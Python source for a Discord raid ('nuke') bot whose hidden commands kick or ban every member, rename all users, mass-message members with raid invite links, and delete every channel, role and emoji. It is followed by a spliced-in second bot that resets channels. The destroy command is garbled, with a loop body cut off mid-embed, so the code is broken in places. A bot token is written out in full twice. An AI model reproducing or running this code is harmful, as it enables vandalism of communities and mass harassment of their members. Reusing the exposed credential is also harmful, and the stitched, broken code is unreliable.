#Made by Misterfergie
from config import prefix
from config import token
import keep_alive
import discord
from discord.ext import commands
from discord.ext.commands import bot
import asyncio
import time
import random
import os
intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix=prefix, intents=intents)
# Sets prefix and intents

client.remove_command("help")

@client.event
async def on_ready():
    print ("Ah shit, here we go again")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

####HELP COMMAND####
@client.command(pass_context=True)
async def secret(ctx):
    await ctx.message.delete()
    member = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='Secret')
    embed.add_field(name='Kall', value='Kicks every member in a server', inline=False)
    embed.add_field(name='Ball', value='Bans every member in a server', inline=False)
    embed.add_field(name='Rall', value='Renames every member in a server', inline=False)
    embed.add_field(name='Mall', value='Messages every member in a server', inline=False)
    embed.add_field(name='Destroy', value='Deleted channels, remakes new ones, deletes roles, bans members, and wipes emojis. In that order', inline=False)
    embed.add_field(name='Ping', value='Gives ping to client (expressed in MS)', inline=False)
    embed.add_field(name='Info', value='Gives information of a user', inline=False)
    await member.send(embed=embed)
#############################

####KALL COMMAND####
@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has FAILED to be kicked")
        print ("Action completed: Kick all")
#############################

####BALL COMMAND####
@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Action completed: Ban all")
#############################

####RALL COMMAND####
@client.command(pass_context=True)

async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} has NOT been renamed")
        print("Action completed: Rename all")
#############################

####MALL COMMAND####
@client.command(pass_context=True)
async def mall(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="Raided by @RaidingERLC", url="https://discord.gg/aeuh2Tuv0", description="@everyone" , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/aeuh2Tuv)",
                inline=False)
            embed.add_field(
                name="free leaks",
                value=
                "[ [ Click here ] ](https://discord.gg/aeuh2Tuv)",
                inline=False)
            embed.add_field(
                name="GitHub",
                value=
                "[ [ Click here ] ](https://discord.gg/aeuh2Tuv)",
                inline=False)
            embed.set_thumbnail(url="")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
#############################

###DESTROY COMMAND####
@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for member in list(client.get_all_members()): 
        
                value=
                "[ [ Click here ] ](https://discord.gg/kE9vk9Zeuf)",
                inline=False)
            embed.add_field(
                name="Youtube Channel",
                value=
                "[ [ Click here ] ](https://www.youtube.com/channel/UCXk0klxbjcVgGvYyKWLgtLg)",
                inline=False)
            embed.add_field(
                name="GitHub",
                value=
                "[ [ Click here ] ](https://github.com/social404)",
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/view/destory-eexplode-nuke-gif-6073338")
            embed.set_footer(text="Nuked By Social404's Bot! Sorry About Your Loss")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Nuked By Social's Bot! Check Dms")
        await channel.send(" @everyone GGGs Guys This Is Kinda Sad But It Is What It Is Am I Right?")
        await channel.send(embed=embed)
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Action completed: Nuclear Destruction")
#############################


####PING COMMAND####
@client.command(pass_context=True)
async def ping(ctx):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    t1 = time.perf_counter()
    await channel.trigger_typing()
    t2 = time.perf_counter()
    embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
    await member.send(embed=embed)
    print("Action completed: Server ping")
#############################

####INFO COMMAND####
@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        await channel.send("**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
    print("Action completed: User Info")
#############################


keep_alive.keep_alive()


client.run(MTMxMDEwOTIxODg2NjU5Mzc5Mg.GRPbG8.MWNvBZNzJ47tbRM9I-MlKZSIaKqVIlV7dewv18)
# Place your Bot's token here
import discord
from discord import app_commands
from discord.ext import commands

# Bot setup
intents = discord.Intents.default()
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()  # Sync the slash commands
        print(f"Synced {len(synced)} commands!")
    except Exception as e:
        print(f"Failed to sync commands: {e}")
    print(f"Logged in as {bot.user}!")

# Slash command to reset channels
@bot.tree.command(name="reset_channels", description="Delete all channels and notify users.")
@app_commands.default_permissions(administrator=True)
async def reset_channels(interaction: discord.Interaction):
    guild = interaction.guild

    # Ask for confirmation
    await interaction.response.send_message(
        "Are you sure you want to reset all channels? Reply with `yes` in this message thread to confirm.",
        ephemeral=True
    )

    def check(msg: discord.Message):
        return msg.author == interaction.user and msg.content.lower() == "yes"

    try:
        # Wait for confirmation
        confirmation = await bot.wait_for("message", check=check, timeout=30)

        # Delete all channels
        for channel in guild.channels:
            await channel.delete()

        # Recreate a general channel
        general_channel = await guild.create_text_channel("general")
        await general_channel.send("@everyone All channels have been reset.")
        await interaction.followup.send("All channels have been reset successfully!", ephemeral=True)

    except TimeoutError:
        await interaction.followup.send("Channel reset canceled. You didn't reply in time.", ephemeral=True)

# Run the bot
bot.run("MTMxMDEwOTIxODg2NjU5Mzc5Mg.GRPbG8.MWNvBZNzJ47tbRM9I-MlKZSIaKqVIlV7dewv18")
